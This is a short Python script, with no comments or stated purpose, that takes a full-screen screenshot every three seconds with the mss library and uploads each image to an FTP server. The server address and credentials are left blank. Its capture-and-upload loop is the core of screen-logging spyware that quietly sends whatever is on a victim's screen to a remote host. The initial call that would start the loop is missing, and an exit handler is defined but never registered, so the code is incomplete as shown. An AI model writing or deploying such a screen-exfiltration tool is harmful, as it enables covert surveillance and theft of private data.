import ftplib
from  mss import mss
import threading
import atexit
val = 0
sct = mss()
ADDRESS = ""
USERNAME = ""
PASSWORD = ""

Transfer = ftplib.FTP(ADDRESS,USERNAME,PASSWORD)
def OnScriptEnd():
    print("Script ending")
    Transfer.quit()

def collectimage():
    filename = sct.shot(mon=-1, output=('screen.png'))
    upload_to_ftp()
    


def upload_to_ftp():
    global val
    filename = 'screen'+ str(val) + '.png'
    file = open('screen.png','rb')   
    val += 1               
    Transfer.storbinary('STOR ' + filename , file)    
    file.close()
    threading.Timer(3,collectimage).start()                                    
    